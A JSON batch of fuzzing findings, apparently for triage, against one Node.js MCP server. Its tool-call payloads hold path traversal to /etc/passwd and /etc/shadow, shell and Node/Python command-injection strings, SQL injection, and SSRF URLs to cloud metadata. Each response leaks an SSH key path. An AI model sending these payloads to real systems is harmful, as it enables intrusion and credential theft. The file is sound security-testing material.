@@ -1,0 +1,968 @@
+{
+ "batch": 41,
+ "n_cluster": 60,
+ "n_finding": 60,
+ "istruzioni": "Per ogni cluster assegnare verdetto VP (vero positivo, vulnerabilita' reale e raggiungibile) o FP (falso positivo), con motivazione breve.",
+ "cluster": [
+  {
+   "id": "db66352fa427",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 32, 'method': 'tools/call', 'params': {'name': 'start_interactive_command', 'arguments': {'command': \"eval('1+1')\"}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 32, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "49a252828a21",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 33, 'method': 'tools/call', 'params': {'name': 'start_interactive_command', 'arguments': {'command': \"' OR 1=1; --\"}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 33, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "0ead8efc1df0",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 34, 'method': 'tools/call', 'params': {'name': 'start_interactive_command', 'arguments': {'command': \"'; DROP TABLE users; --\"}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 34, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "fbfb2cfd3eff",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 35, 'method': 'tools/call', 'params': {'name': 'start_interactive_command', 'arguments': {'command': '1 UNION SELECT * FROM information_schema.tables; --'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 35, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "d7279cfbb415",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 36, 'method': 'tools/call', 'params': {'name': 'start_interactive_command', 'arguments': {'command': 'http://169.254.169.254/latest/meta-data/'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 36, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "04738c6ebc14",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 37, 'method': 'tools/call', 'params': {'name': 'start_interactive_command', 'arguments': {'command': 'http://localhost:6379/'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 37, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "6ac420eaffca",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 38, 'method': 'tools/call', 'params': {'name': 'start_interactive_command', 'arguments': {'command': 'file:///etc/passwd'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 38, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "785800b81d55",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 39, 'method': 'tools/call', 'params': {'name': 'send_input_to_command', 'arguments': {'input': 'test', 'session_id': '../../../etc/passwd'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 39, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "a865052a73fe",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 40, 'method': 'tools/call', 'params': {'name': 'send_input_to_command', 'arguments': {'input': 'test', 'session_id': '....//....//etc/shadow'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 40, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "0a90f44b73ea",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 41, 'method': 'tools/call', 'params': {'name': 'send_input_to_command', 'arguments': {'input': 'test', 'session_id': '/etc/passwd'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 41, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "42b0b201fecc",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 43, 'method': 'tools/call', 'params': {'name': 'send_input_to_command', 'arguments': {'input': 'test', 'session_id': 'whoami; cat /etc/passwd'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 43, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "900238d08db2",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 44, 'method': 'tools/call', 'params': {'name': 'send_input_to_command', 'arguments': {'input': 'test', 'session_id': '$(id)'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 44, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "723749a74c57",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 45, 'method': 'tools/call', 'params': {'name': 'send_input_to_command', 'arguments': {'input': 'test', 'session_id': '`cat /etc/passwd`'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 45, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "448ca8e9c288",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 46, 'method': 'tools/call', 'params': {'name': 'send_input_to_command', 'arguments': {'input': 'test', 'session_id': 'test && ls -la /'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 46, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "fdbd0a6c3903",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 47, 'method': 'tools/call', 'params': {'name': 'send_input_to_command', 'arguments': {'input': 'test', 'session_id': 'test || id'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 47, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "cbce361c1b9f",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 48, 'method': 'tools/call', 'params': {'name': 'send_input_to_command', 'arguments': {'input': 'test', 'session_id': \"__import__('os').system('id')\"}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 48, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "75788c5eab83",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 49, 'method': 'tools/call', 'params': {'name': 'send_input_to_command', 'arguments': {'input': 'test', 'session_id': \"require('child_process').execSync('id').toString()\"}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 49, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "c903f565a7a2",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 50, 'method': 'tools/call', 'params': {'name': 'send_input_to_command', 'arguments': {'input': 'test', 'session_id': \"eval('1+1')\"}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 50, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "dab89bf95bca",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 51, 'method': 'tools/call', 'params': {'name': 'send_input_to_command', 'arguments': {'input': 'test', 'session_id': \"' OR 1=1; --\"}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 51, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "36cac14ea671",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 52, 'method': 'tools/call', 'params': {'name': 'send_input_to_command', 'arguments': {'input': 'test', 'session_id': \"'; DROP TABLE users; --\"}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 52, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "481ff30626fb",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 53, 'method': 'tools/call', 'params': {'name': 'send_input_to_command', 'arguments': {'input': 'test', 'session_id': '1 UNION SELECT * FROM information_schema.tables; --'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 53, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "8b2b880225b1",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 54, 'method': 'tools/call', 'params': {'name': 'send_input_to_command', 'arguments': {'input': 'test', 'session_id': 'http://169.254.169.254/latest/meta-data/'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 54, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "14f07dc1fc32",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 55, 'method': 'tools/call', 'params': {'name': 'send_input_to_command', 'arguments': {'input': 'test', 'session_id': 'http://localhost:6379/'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 55, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "c570bde446f6",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 56, 'method': 'tools/call', 'params': {'name': 'send_input_to_command', 'arguments': {'input': 'test', 'session_id': 'file:///etc/passwd'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 56, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "a8947f6415de",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 57, 'method': 'tools/call', 'params': {'name': 'get_command_output', 'arguments': {'session_id': '../../../etc/passwd'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 57, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "56fe91e35489",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 58, 'method': 'tools/call', 'params': {'name': 'get_command_output', 'arguments': {'session_id': '....//....//etc/shadow'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 58, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "9455c0fc3d17",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 59, 'method': 'tools/call', 'params': {'name': 'get_command_output', 'arguments': {'session_id': '/etc/passwd'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 59, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "a1d797e2f579",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 61, 'method': 'tools/call', 'params': {'name': 'get_command_output', 'arguments': {'session_id': 'whoami; cat /etc/passwd'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 61, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "59321d3364b1",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 62, 'method': 'tools/call', 'params': {'name': 'get_command_output', 'arguments': {'session_id': '$(id)'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 62, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "d0f9ca559d6a",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 63, 'method': 'tools/call', 'params': {'name': 'get_command_output', 'arguments': {'session_id': '`cat /etc/passwd`'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 63, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "4a9a1fdfbff6",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 64, 'method': 'tools/call', 'params': {'name': 'get_command_output', 'arguments': {'session_id': 'test && ls -la /'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 64, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "0d826e4d5122",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 65, 'method': 'tools/call', 'params': {'name': 'get_command_output', 'arguments': {'session_id': 'test || id'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 65, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "a3ca296061a4",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 66, 'method': 'tools/call', 'params': {'name': 'get_command_output', 'arguments': {'session_id': \"__import__('os').system('id')\"}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 66, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "4b45c8b8c103",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 67, 'method': 'tools/call', 'params': {'name': 'get_command_output', 'arguments': {'session_id': \"require('child_process').execSync('id').toString()\"}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 67, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "f1a6222d3fe5",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 68, 'method': 'tools/call', 'params': {'name': 'get_command_output', 'arguments': {'session_id': \"eval('1+1')\"}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 68, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "6fb9570856aa",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 69, 'method': 'tools/call', 'params': {'name': 'get_command_output', 'arguments': {'session_id': \"' OR 1=1; --\"}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 69, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "963d8c3545bf",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 70, 'method': 'tools/call', 'params': {'name': 'get_command_output', 'arguments': {'session_id': \"'; DROP TABLE users; --\"}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 70, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "2974bc87b65f",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 71, 'method': 'tools/call', 'params': {'name': 'get_command_output', 'arguments': {'session_id': '1 UNION SELECT * FROM information_schema.tables; --'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 71, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "99076155418d",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 72, 'method': 'tools/call', 'params': {'name': 'get_command_output', 'arguments': {'session_id': 'http://169.254.169.254/latest/meta-data/'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 72, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "861cd357801a",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
